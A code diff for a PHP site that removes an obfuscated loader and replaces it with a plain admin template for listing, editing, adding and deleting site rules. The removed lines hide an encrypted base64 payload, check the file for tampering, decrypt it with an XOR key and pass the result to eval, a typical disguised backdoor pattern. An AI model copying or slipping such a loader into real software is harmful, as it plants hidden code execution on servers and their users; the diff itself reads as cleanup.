@@ -1,24 +1,99 @@
-<?php
-$nyycbr="74cc01d7723e38d21fcef0693db172a6";
-$yclmrnl="0f510557010352050f5001520508555757525007505401005705060606075055";
-$pkpgqrtkahs="QL+7bO691AQoHG1eyTeuysG0GTpAk5+PJDnNZS7P67TS4erZIdkqFY3/75Jjz8brdTOB8qak2dDOQ0UmAqsuvLSCfVMg7Rslt0NomjAxUOw2V64pWKJhYa3iRU1tG18j3J+MzlvDrvchcCMtStB4A9G3LGjnhUc/NrYzPw8+erWqRky9ABNIID7BVfZaLNO+r9AglGTBk5dZ9E9GkhIF9hOmzyGYwMiyWJ2fwnb+6/0M8sZHLS3Wkg27brjEhXonmzEVdlLWx3b8wtBgO+dHsaxhZVolv3Oj6DIlE7y8B8b6WuQ+jB3oEU7jvCXwDiuZ4DaN9/z31/KNXKOc9Ao1pqIiR8q5Y5yaLJZZvw8jxxK2Cpu7J8gHCfhCqVqfILvrDBnonxNubbep02n+dawgo+Lu/7JrkrUn1vZdV57Z+euHnWrpf+70qOjNKarQuvy1oRzJm1dWtvxG+XUTBuCBr0f/uI5UzcouM2k0oD1h6OlGsSJ7DxNWwCJNNWSctVZIH4dtsYUTN8epwrbsDlUhJwzYHXwQKBHwEkfwI7v6YCHMI86l1aMbUKSBVKLYMyT/ySdSIdoVlJDu5SoxsMYk4wp1Lfj80uZf/of4/DBz1h9WqNAHjcWyaT0P9epX1UBPIIb2JHQgTkAyNbBWwnRVa6nzWl+fHKpi/0vLjr2T4292F61jf2WLICgedaMe+tR8I+WjOJ1lq7e442sJhJCSDsHYFz1fCCr1X4SSSM6msWFN+/XKN6T0YzXIhrrIt4KLEr8CcLTKBdxn7+0SwRXg0fZ/wGzrRYZSBqeOY1wvytizm+a5G9ut5GYUVpe4utRK3Z7G6GkF5ZLNggr05PKmILm5qjU2n2TBBxGTDt0jdSZvSnDK3YjKtyR2DkzwadLex0iu5PwfYcRK+i+DMrYp6sjjNEORq/GkKr1gf04BxqulLTIhdQeUSq+cSV/h1/tS8AB/NV3KnJu6LDh6DMDEW86YzEV+A0FK4dE2eSeNkthFrlxCWiepQWM+X6YPsUy5hZfHRc1OA2l2xeFE+PBfYwAd/nEekMa/vz5BQA5K6J3+Yyf/MSI69b2bgyg28vEoZnXQMhV2WQMkS+OQQlRLGKmkubrA7Um0Eo1SawdPPP6JG4BZpTox13HUz1nnTfU2YjEFQcr5wIktcWOeKqbnq+NxT72eZzHrJigRyo9Cg85Lsr3a7d0O3Mx5X5cwGb42b9mbDmbjAVJmziiAxpny72ZzAItgkflqSTS6TIXvC6XYAExbk/sgQLn+8nlpMpXm6Lphr0+WSgQ5Leyh5T6DWaO/Zm3fQpX28CW31KYpxmw3mfhCjtb+VlYkZl8ci8lwOg72educ4yMVtIPWlpRrB+7uIo0bCDPohUAgW77O785deahjzHUZ6GMt7XUlIbckaJGniOXHuUH6+cwg9WSnig==";
-$btaioqeqy=file_get_contents(__FILE__);
-$yojakfg=str_replace($pkpgqrtkahs,"",$btaioqeqy);
-if(strpos($yojakfg,"ec"."ho")!==false||strpos($yojakfg,"pr"."int")!==false||strpos($yojakfg,"var_"."dump")!==false||strpos($yojakfg,"file_put_"."contents")!==false||strpos($yojakfg,"fw"."rite")!==false){die();}
-$mxqoakte=str_replace(array($nyycbr,$yclmrnl),array("SP_6db5ef0f","KP_257551a5"),$btaioqeqy);
-$qoouoaba=md5($mxqoakte);
-$tcbbxwwsmmr=hex2bin($yclmrnl);
-$bihkythojqs="";
-$eppnjl=strlen($qoouoaba);
-for($cowugpxv=0;$cowugpxv<$eppnjl;$cowugpxv++){
-$bihkythojqs.=chr(ord($tcbbxwwsmmr[$cowugpxv])^ord($qoouoaba[$cowugpxv]));
-}
-$xqasgtk=base64_decode($pkpgqrtkahs);
-$ynhcjlrm=strlen($xqasgtk);
-$riayvnpq="";
-$xxqpeimp=strlen($bihkythojqs);
-for($cowugpxv=0;$cowugpxv<$ynhcjlrm;$cowugpxv++){
-$riayvnpq.=$xqasgtk[$cowugpxv]^$bihkythojqs[$cowugpxv%$xxqpeimp];
-}
-$wgwnwenc="gzun"."compress";
-eval('?>' . $wgwnwenc($riayvnpq) . '<?php ');
+<h2><?= __('admin.rules.title') ?></h2>
+
+<?php if (!empty($rules)): ?>
+    <table class="vis" width="100%">
+        <tr>
+            <th><?= __('admin.rules.col_section') ?></th>
+            <th><?= __('admin.rules.col_title') ?></th>
+            <th><?= __('admin.rules.col_order') ?></th>
+            <th><?= __('admin.rules.col_actions') ?></th>
+        </tr>
+        <?php foreach ($rules as $rule): ?>
+            <tr>
+                <td><?= htmlspecialchars($rule['section']) ?></td>
+                <td><?= htmlspecialchars($rule['title']) ?></td>
+                <td><?= $rule['order_num'] ?></td>
+                <td>
+                    <a href="#" onclick="editRule(<?= $rule['id'] ?>); return false;" class="btn" style="padding: 2px 8px; font-size: 10px; background: #ff9800; border-color: #e65100; color: white;"><i class="fas fa-edit"></i> <?= __('admin.rules.btn_edit') ?></a>
+                    <form method="post" style="display:inline; margin-left: 2px;"
+                        onsubmit="return confirm('<?= addslashes(__('admin.rules.del_confirm')) ?>');">
+                        <input type="hidden" name="rule_id" value="<?= $rule['id'] ?>">
+                        <button type="submit" name="delete_rule" class="btn btn-cancel" style="padding: 2px 8px; font-size: 10px;"><i class="fas fa-trash"></i> <?= __('admin.rules.btn_del') ?></button>
+                    </form>
+                </td>
+            </tr>
+            <tr id="edit-<?= $rule['id'] ?>" style="display:none;">
+                <td colspan="4">
+                    <form method="post">
+                        <input type="hidden" name="rule_id" value="<?= $rule['id'] ?>">
+                        <table width="100%">
+                            <tr>
+                                <td><strong><?= __('admin.rules.form_section') ?></strong></td>
+                                <td><input type="text" name="section" value="<?= htmlspecialchars($rule['section']) ?>"
+                                        style="width:100%;" required></td>
+                            </tr>
+                            <tr>
+                                <td><strong><?= __('admin.rules.form_title') ?></strong></td>
+                                <td><input type="text" name="title" value="<?= htmlspecialchars($rule['title']) ?>"
+                                        style="width:100%;" required></td>
+                            </tr>
+                            <tr>
+                                <td><strong><?= __('admin.rules.form_content') ?></strong></td>
+                                <td><textarea name="content" rows="10" style="width:100%;"
+                                        required><?= htmlspecialchars($rule['content']) ?></textarea></td>
+                            </tr>
+                            <tr>
+                                <td><strong><?= __('admin.rules.form_order') ?></strong></td>
+                                <td><input type="number" name="order_num" value="<?= $rule['order_num'] ?>" required></td>
+                            </tr>
+                            <tr>
+                                <td colspan="2">
+                                     <button type="submit" name="edit_rule" class="btn"><i class="fas fa-save"></i> <?= __('admin.rules.btn_save') ?></button>
+                                    <button type="button" class="btn" style="background: #555;"
+                                        onclick="document.getElementById('edit-<?= $rule['id'] ?>').style.display='none';"><i class="fas fa-times"></i> <?= __('admin.rules.btn_cancel') ?></button>
+                                </td>
+                            </tr>
+                        </table>
+                    </form>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+    </table>
+<?php else: ?>
+    <p><?= __('admin.rules.no_rules') ?></p>
+<?php endif; ?>
+
+<br>
+<h3><?= __('admin.rules.add_rule') ?></h3>
+<form method="post">
+    <table class="vis" width="100%">
+        <tr>
+            <td><strong><?= __('admin.rules.form_section') ?></strong></td>
+            <td><input type="text" name="section" placeholder="<?= __('admin.rules.placeholder_section') ?>" required></td>
+        </tr>
+        <tr>
+            <td><strong><?= __('admin.rules.form_title') ?></strong></td>
+            <td><input type="text" name="title" placeholder="<?= __('admin.rules.placeholder_title') ?>" required></td>
+        </tr>
+        <tr>
+            <td><strong><?= __('admin.rules.form_content') ?></strong></td>
+            <td><textarea name="content" rows="10" style="width:100%;" placeholder="<?= __('admin.rules.placeholder_content') ?>"
+                    required></textarea></td>
+        </tr>
+        <tr>
+            <td><strong><?= __('admin.rules.form_order') ?></strong></td>
+            <td><input type="number" name="order_num" value="0" required></td>
+        </tr>
+        <tr>
+            <td colspan="2">
+                <button type="submit" name="add_rule" class="btn" style="background: #4caf50; border-color: #388e3c; color: white;"><i class="fas fa-plus-circle"></i> <?= __('admin.rules.btn_add') ?></button>
+            </td>
+        </tr>
+    </table>
+</form>
+
+<script>
+    function editRule(id) {
+        document.getElementById('edit-' + id).style.display = 'table-row';
+    }
+</script>
